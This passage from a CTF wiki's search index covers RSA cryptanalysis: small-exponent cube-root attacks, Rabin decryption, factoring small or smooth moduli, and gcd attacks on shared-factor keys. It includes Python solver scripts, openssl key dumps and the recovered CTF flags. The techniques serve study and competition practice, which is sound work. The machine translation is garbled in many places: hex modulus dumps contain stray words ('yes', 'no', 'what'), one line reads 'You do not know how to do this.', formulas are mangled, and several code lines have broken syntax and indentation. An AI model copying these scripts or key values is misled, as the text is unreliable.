0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n\n    if p * q == n:\n\n        print 'true'\n\nPhin = (p - 1) * (q - 1)\nd = gmpy2.invert (e, phin)\n    cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n\n    flag = gmpy2.powmod(cipher, d, n)\n\n    print long_to_bytes(flag)\n</code></pre> <p>Get flag</p> <pre><code>true\n\nhctf{d8e8fca2dc0f896fd7cb4cb0031ba249}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/","title":"Public Key Index Related Attacks","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#small-public-key-index-attack","title":"Small public key index attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-conditions","title":"Attack conditions","text":"<p>e is very small, such as e is 3.</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-principle","title":"Attack principle","text":"<p>Suppose the user uses the key e=3. Considering that the encryption relationship is satisfied:</p> <p>$$</p> <p>c\\equiv m^3 \\bmod N</p> <p>$$</p> <p>then:</p> <p>$$</p> <p>\\begin{align*}</p> <p>m^3 &amp;= c+k\\times N\\</p> <p>m &amp;= \\sqrt[3]{c+k\\times n}</p> <p>\\end{align*}</p> <p>$$</p> <p>An attacker can enumerate k from small to large and open three roots in turn until an integer is opened.</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#examples","title":"Examples","text":"<p>Here we take the XMan Summer Camp class exercise as an example (Jarvis OJ has a recurrence), the attachment has a <code>flag.enc</code> and <code>pubkey.pem</code>, which is obviously a ciphertext and a public key. Openssl` Read the public key.</p> <pre><code>\u279c  Jarvis OJ-Extremely hard RSA git:(master) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus       \n\nPublic-Key: (4096 bit)\n\nModulus:\n\n    00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6:\n\n18: fc: 8c: 7d: 7d: 03: b8: 2e: 40: 99: 51: c1: 82: f3: 98:\nfrom: e3: 10: 45: 80: e7: no: 70: d3: 83: yes: 53: 11: 47: 56:\n    56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65:\n\ndb: 0b: 12: 2c: a4: 0e: 42: fa: 70: 91: 89: b7: 19:\nd7: 46: E2: F6: 06: 9b: of: 11: ce: bd: 65: 0f: 14: b9: 3c:\n97: 73: 52: fd: 13: b1: yes: a6: d6: e1: da: 77: 55: 02: ab:\n    ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2:\n\n05: 68: 48: 92: 84: e1: 81: f6, f1: 1E: 27: 08: 91: c8: if:\n80: 01: 7b: ad: 23: 8e: 36: 30: 39: a:\n    10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15:\n\n79: c7: 52: 5a: 69: 98: 4f: 15: b5: 66: 7f: 34: 20:\neb: 26: 11: 36: 94: 7f: a1: 23: e5: 49: df: ff: 00: 60: 18:\n83: of: D9: 36: fe: 41: 1e: 00: 6e: 4e: 93: D1: A0: 0b: 0f:\nea: 54: 1b: bf: c8: c5: 18: 6c: b6: 22: 05: 03:\n13: 11: 0d: 64: 0c: 77: ea: 54: no: 32: 20: fc: 8f: 4c: c6:\nwhat: 77: 15: 1e: 29: b3: e0: 65: 78: c4: 78:\n    45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca:\n\n    d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86:\n\n    02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc:\n\ndd: 93: 27: 06: 80: 95: ef: a0: 10: b7: f1: 96: c7: 4b:\nc3: 7b: 12: 8f: 9e: 14: 11: 75: 16: 33: f7: 8b: 7b: 9e: 56:\nf7: 1f: 77: a1: b4: da: ad: 3f: c5: 4b: 5e: 7e:\n    a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5:\n\n    c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4:\n\n    5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2:\n\n08: d8: the 47: 36: ba: 39: A0: 35: 44: 26: fa: e0: 06: 7:\nfe: 52: d5: 26: 7d: cf: b9: c3: 88: 4f: 51: fd: df: df: 4a:\n97: 94: bc: fe: 0e: 15: 57: 11: 37: 49: e6: c8: ef: 42: 1d:\nYou do not know how to do this.\n2d: 34: 88: f7: 6d: eb: 62: bd: ef: 7b: ea: 60: 26: f2: 2a:\n1d: 25: aa: 2a: 92: d1: 17: 4b:\n98: 03: e6: bb: 5f: ad: 75: e1: 86: a9: 46: a1:\n0f: 12: 43: f4: 38: 74: 46: cc: this: b2: 22: 2a: 96: 5c: c3:\n    0b:39:29\n\nExponent: 3 (0x3)\n\nModulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\n\nwriting RSA key\n\n-----BEGIN PUBLIC KEY-----\n\nMIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4 + nlp + jQC0kzVcYY\n/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs\n\npA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff\n\n0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON\n\nRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH + hI + VJ3 / 8AYBiDr9k2 / kEeAG5Ok9Gg\nCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF\n\nie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG\n\ngJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl\n\nUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE\n\nJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC\n\nLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP\n\nEkP0OHRGzM6yIiqWXMMLOSkCAQM=\n\n-----END PUBLIC KEY-----\n</code></pre> <p>Seeing e=3, it is clear that the small public key index attacked. Here we use the Crypto library to read the public key and use multiprocessing to speed up the crack.</p> <pre><code>#/usr/bin/python\n\n# coding=utf-8\n\nimport gmpy2\n\nfrom Crypto.PublicKey import RSA\n\nfrom multiprocessing import Pool\n\npool = Pool(4)\n\n\n\nwith open('./pubkey.pem', 'r') as f:\n\n    key = RSA.importKey(f)\n\n    N = key.n\n\ne = key.e\nwith open('flag.enc', 'r') as f:\n\n    cipher = f.read().encode('hex')\n\n    cipher = int(cipher, 16)\n\n\n\n\n\ndef calc(j):\n\n    print j\n\n    a, b = gmpy2.iroot(cipher + j * N, 3)\n\n    if b == 1:\n\n        m = a\n\n        print '{:x}'.format(int(m)).decode('hex')\n\n        pool.terminate()\n\n        exit()\n\n\n\n\n\ndef SmallE():\n\n    inputs = range(0, 130000000)\n\n    pool.map(calc, inputs)\n\n    pool.close()\n\n    pool.join()\n\n\n\n\n\nif __name__ == '__main__':\n\n    print 'start'\n\nSmallE ()\n</code></pre> <p>The blasting time is a bit long, get the flag</p> <pre><code>Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#title","title":"Title","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#rsa-derivative-algorithm-rabin-algorithm","title":"RSA Derivative Algorithm - Rabin Algorithm","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-conditions_1","title":"Attack conditions","text":"<p>The Rabin algorithm is characterized by e=2.</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-principle_1","title":"Attack principle","text":"<p>Ciphertext:</p> <p>$$</p> <p>c = m ^ 2  n way $$</p> <p>Decryption:</p> <ul> <li>Calculate m_p and m_q:</li> </ul> <p>$$</p> <p>\\begin{align*}</p> <p>m_p &amp; =  sqrt {c}  p \\ way m_q &amp; =  sqrt {c}  q way \\end{align*}</p> <p>$$</p> <ul> <li>Calculate y_p and y_q with extended Euclidean:</li> </ul> <p>$$</p> <p>y_p \\cdot p + y_q \\cdot q = 1</p> <p>$$</p> <ul> <li>Solve four plaintexts:</li> </ul> <p>$$</p> <p>\\begin{align*}</p> <p>a &amp;= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\</p> <p>b &amp;= n - a\\</p> <p>c &amp;= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\</p> <p>d &amp;= n - c</p> <p>\\end{align*}</p> <p>$$</p> <p>Note: If p \\equiv q \\equiv 3 \\pmod 4, then</p> <p>$$</p> <p>\\begin{align*}</p> <p>m_p &amp; c = ^ { frac {1} {4} (p + 1)}  p \\ way m_q &amp; c = ^ { frac {1} {4} (q + 1)}  q way \\end{align*}</p> <p>$$</p> <p>In general, p \\equiv q \\equiv 3 \\pmod 4 is satisfied. For cases that are not met, please refer to the corresponding algorithm.</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#examples_1","title":"Examples","text":"<p>Here we take the XMan Summer Camp class exercise (Jarvis OJ has a recurrence) as an example, read the public key.</p> <pre><code>\u279c  Jarvis OJ-hard RSA git:(master) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus \n\nPublic-Key: (256 bit)\n\nModulus:\n\n00: c2: 63: 6a: e5: c3: d8: e4: 3f: fb: 97: ab:\n    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:\n\n    be:30:dd\n\nExponent: 2 (0x2)\n\nModulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD\n\nwriting RSA key\n\n-----BEGIN PUBLIC KEY-----\n\nMDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ / + 5erCQKPGqxsC / bNPXDr\nyigb / + l / vjDdAgEC\n-----END PUBLIC KEY-----\n</code></pre> <p>e=2, consider the Rabin algorithm. First, let's break down p and q first.</p> <pre><code>p=275127860351348928173285174381581152299\n\nq=319576316814478949870590164193048041239\n</code></pre> <p>Write code</p> <pre><code>#!/usr/bin/python\n\n# coding=utf-8\n\nimport gmpy2\n\nimport string\n\nfrom Crypto.PublicKey import RSA\n\n\n\n# Read public key parameters\nwith open('pubkey.pem', 'r') as f:\n\n    key = RSA.importKey(f)\n\n    N = key.n\n\ne = key.e\nwith open('flag.enc', 'r') as f:\n\n    cipher = f.read().encode('hex')\n\n    cipher = string.atoi(cipher, base=16)\n\n    # print cipher\n\nprint \"please input p\"\n\np = int(raw_input(), 10)\n\nprint 'please input q'\n\nq = int(raw_input(), 10)\n\n#\u7b97 yp\u548cyq\ninv_p = gmpy2.invert(p, q)\n\ninv_q = gmpy2.invert(q, p)\n\n\n\n#\u7b97mp mp and mq\nmp = pow(cipher, (p + 1) / 4, p)\n\nmq = pow(cipher, (q + 1) / 4, q)\n\n\n\n# Calculate a, b, c, d\na = (inv_p * p * mq + inv_q * q * mp) % N\n\nb = N - int(a)\n\nc = (inv_p * p * mq - inv_q * q * mp) % N\n\nD = N - int (c)\n\n\nfor i in (a, b, c, d):\n\n    s = '%x' % i\nif len (s)% 2! = 0:\n        s = '0' + s\n\n    print s.decode('hex')\n</code></pre> <p>Get the flag, <code>PCTF{sp3ci4l_rsa}</code>.</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#title_1","title":"Title","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/","title":"Modulo-related Attacks","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#bruteforcing-factors-of-n","title":"Bruteforcing Factors of N","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-prerequisite","title":"Attack Prerequisite","text":"<ol> <li>N is efficiently small (less than 512 bits, for example).</li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvisoj-easy-rsa","title":"JarvisOJ - Easy RSA","text":"<p>Here we take \"JarvisOJ - Easy RSA\" as an example, the challenge description is the following:</p> <p>&gt; Remember the veryeasy RSA? Is it not difficult? Then continue to look at this question, this question is not difficult. &gt; Known piece of RSA encrypted information is: 0xdc2eeeb2782c and the public key used for encryption is known: &gt; N = 322831561921859 and = 23 &gt; Please decrypt the plaintext, please convert the number into ascii code submission when submitting &gt; For example, if the plaintext you solved is 0x6162, please submit the string ab &gt; Submit format: <code>PCTF{clear text string}</code></p> <p>We can see that our N is small. Here we can query the factors of N manually from factordb:</p>  322831561921859 = 13574881 \\times 23781539  <p>But a better solution is to utilize factordb-python for factoring automation:</p> <pre><code>#!/usr/bin/env python3\nfrom Crypto.Util.number import inverse, long_to_bytes\nfrom factordb.factordb import FactorDB\n\n#--------data--------#\n\nN = 322831561921859\ne = 23\nc = 0xdc2eeeb2782c\n\n#--------factordb--------#\n\nf = FactorDB(N)\nf.connect()\nfactors = f.get_factor_list()\n\n#--------rsa--------#\n\nphi = 1\nfor factor in factors:\n    phi *= factor - 1\n\nd = inverse(e, phi)\nm = pow(c, d, N)\nflag = long_to_bytes(m).decode()\n\nprint(flag)\n</code></pre> <p>Run the script and grab your flag.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q-improper-decomposition-n","title":"p &amp; q Improper decomposition N","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-conditions","title":"Attack conditions","text":"<p>We can also attack when p and q are not selected properly in RSA.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#pq-very-large","title":"|pq| Very large","text":"<p>When pq is large, there must be a certain parameter is small, here we assume p, then we can try to divide the modulus by exhaustive method, and then decompose the modulus, get the confidential parameters and plaintext information. Basically, it is not very feasible.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#pq-smaller","title":"|pq| Smaller","text":"<p>First of all</p>  \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4}  <p>Since |pq| is small, \\frac{(pq)^2}{4} is naturally small, and \\frac{(p+q)^2}{4} is only slightly larger than N. , so \\frac{p+q}{2} is similar to \\sqrt{n}. Then we can decompose as follows</p> <ul> <li>Check each integer x of \\sqrt{n} in sequence until you find an x such that x^2-n is the square number, denoted as y^2</li> <li>Then x^2-n=y^2, and then decompose N according to the squared difference formula</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1-smooth","title":"p - 1 Smooth","text":"<p>When p is a factor of N and p - 1 is smooth, it is possible to use the Pollard's p \u2212 1 algorithm to decompose N, but it is not entirely successful.</p> <p>Warning</p> <p>Principle analysis to be completed</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1-smooth_1","title":"p + 1 Smooth","text":"<p>When p is a factor of n and p + 1 is smooth, it may be possible to use the Williams's p + 1 algorithm to decompose N, but it is not entirely successful.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#2017-seccon-very-smooth","title":"2017 SECCON very smooth","text":"<p>The program gives an HTTPS encrypted traffic packet, first getting the certificate from it.</p> <pre><code>\u279c  2017_SECCON_verysmooth git:(master) binwalk -e s.pcap      \n\n\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n\n--------------------------------------------------------------------------------\n\n2292          0x8F4           Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n\n4038          0xFC6           Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n\n5541          0x15A5          Certificate in DER format (x509 v3), header length: 4, sequence length: 467\n\n\n\n\u279c 2017_SECCON_verysmooth git: (master) ls\ns.pcap  _s.pcap.extracted  very_smooth.zip\n</code></pre> <p>Here are three certificates, three modules are the same, only one example is given here.</p> <pre><code>\u279c  _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt  -pubkey -text -modulus -noout \n\n-----BEGIN PUBLIC KEY-----\n\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy\n\n8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj\nDUddp + 4X8C9jtvCaLTgd + baSjo2eB0f + uiSL / 9 / 4NN + vR3FliRm2mByeFCjppTQl\nyioxCqbXYIMxGO4NcQIDAQAB\n-----END PUBLIC KEY-----\n\nCertificate:\n\n    Data:\n\n        Version: 1 (0x0)\n\n        Serial Number: 11640506567126718943 (0xa18b630c7b3099df)\n\n    Signature Algorithm: sha256WithRSAEncryption\n\n        Issuer: C=JP, ST=Kawasaki, O=SRL\n\n        Validity\n\n            Not Before: Oct  8 02:47:17 2017 GMT\n\n            Not After : Oct  8 02:47:17 2018 GMT\n\n        Subject: C=JP, ST=Kawasaki, O=SRL\n\n        Subject Public Key Info:\n\n            Public Key Algorithm: rsaEncryption\n\n                Public-Key: (1024 bit)\n\n                Modulus:\n\n                    00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe:\n\n                    48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0:\n\nc5: c2: 7b: 67: 03: 5a: ec: 19: 2b: 37: 41: dd: 1f: 4d: 12:\n75: 31: b0: 7a: b0: 12: eb: 86: 24: 1c: 09: c0: 81: 49: 9e:\n69: ef: 5a: ea: c7: 8d: c6: 23: 0d: 47: 5d: a7: ee: 17: f0:\n2f: 63: b6: f0: 9a: 2d: 38: 1d: f9: b6: 92: 8e: 8d: 9e:47: fe: ba: 24: 8b: ff: df: f8: 9c: df: af: 47: 71: 65: 89:\n19: b6: 98: 1: 9e: 14: 28: e9: a5: 34: 25: ca: 2a: 31: 0a:\na6: d7: 60: 83: 31: 18: in: 0d: 71\n                Exponent: 65537 (0x10001)\n\n    Signature Algorithm: sha256WithRSAEncryption\n\n78: 92: 11: fb: 6c: e1: 7a: f7: 2a: 33: b8: 8b: 08: a7: f7: 5b: de: cf:\n         62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3:\n\n         32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46:\n\n         f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c:\n\n         6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96:\n\nbf: 5b: a7: ee: 8b: 1e: 48: a7: d2: 43: 06: 0e: 4f: 5a: 86: 62: 69:\ne2: c0: bd: 4e: 89: c9: af: 04: 4a: 77: a2:\nb7: 39\nModulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71\n</code></pre> <p>It can be seen that the modulus is only 1024 bits. Moreover, according to the title name very smooth, it should be one of the factors comparing smooth, here we use the primaryfac to try Pollard's p \u2212 1 and Williams's p + 1 algorithm respectively, as follows</p> <pre><code>\u279c  _s.pcap.extracted git:(master) python -m primefac -vs -m=p+1  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\n\n\n149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\nZ309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n</code></pre> <p>It can be found that when using the Williams's p + 1 algorithm, it is directly decomposed. It is reasonable to say that this factor is p-1 seems to be smoother, but it cannot be decomposed using the Pollard's p \u2212 1 algorithm. Further testing is done here.</p> <pre><code>\u279c  _s.pcap.extracted git:(master) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002\n\n\n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\n\nZ154  =  P1 x P1 x P2 x P3 x P6 x P142  =  2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\n\n\n\n\u279c  _s.pcap.extracted git:(master) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 \n\n\n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5\n\nZ154  =  P1^185 x P1^62 x P1^97  =  2^185 x 3^62 x 5^97\n</code></pre> <p>It can be seen that there are indeed many small factors for p-1, but the number is too large, which will cause an exponential explosion when enumerating, so it is not decomposed.</p> <p>And construct a private key based on the decomposed number</p> <pre><code>from Crypto.PublicKey import RSA\n\nimport gmpy2\n\n\n\n\n\ndef main():\n\n    n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n\n    p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L\n\n    q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n\ne = 65537L\n    priv = RSA.construct((n, e, long(gmpy2.invert(e, (p - 1) * (q - 1)))))\n\n    open('private.pem', 'w').write(priv.exportKey('PEM'))\n\n\n\n\n\nmain()\n</code></pre> <p>Finally, import the private key into wireshark to get the plain text (Edit -&gt; Preferences -&gt; Protocols -&gt; SSL -&gt; RSA Key List).</p> <pre><code>&lt;html&gt;\n\n&lt;head&gt;&lt;title&gt;Very smooth&lt;/title&gt;&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;h1&gt;\n\nAnswer: One of these primes is very smooth.\n\n&lt;/h1&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#extension","title":"Extension","text":"<p>For more on some methods of decomposing the modulus N, please refer to https://en.wikipedia.org/wiki/Integer_factorization.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#non-coprime-moduli","title":"Non-coprime Moduli","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-prerequisite_1","title":"Attack Prerequisite","text":"<p>When there are two public keys, N is not mutually prime, we can obviously obtain the greatest common factor directly for these two numbers, and then directly obtain p, q, and then obtain the corresponding private key.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#sctf-rsa2","title":"SCTF RSA2","text":"<p>Here we take SCTF rsa2 as an example. Open the pcap package directly and find that there are a bunch of messages, including N and e, and then try to test whether the different N is mutual. I tried the first two.</p> <pre><code>import gmpy2\n\nn1 =\nn2 =\nprint gmpy2.gcd(n1, n2)\n</code></pre> <p>The results found that they were not mutually exclusive.</p> <pre><code>\u279c  scaf-rsa2 git:(master) \u2717 python exp.py\n\n122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137\n</code></pre> <p>Then we can decrypt it directly, here we use the first pair of public key ciphers. code show as below</p> <pre><code>from Crypto.PublicKey import RSA\n\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\n\nimport gmpy2\n\nfrom base64 import b64decode\n\nn1 =\nn2 =\np1 = gmpy2.gcd(n1, n2)\n\nq1 = n1 / p1\n\ne = 65537\nphin = (p1 - 1) * (q1 - 1)\nd = gmpy2.invert (e, phin)\ncipher = 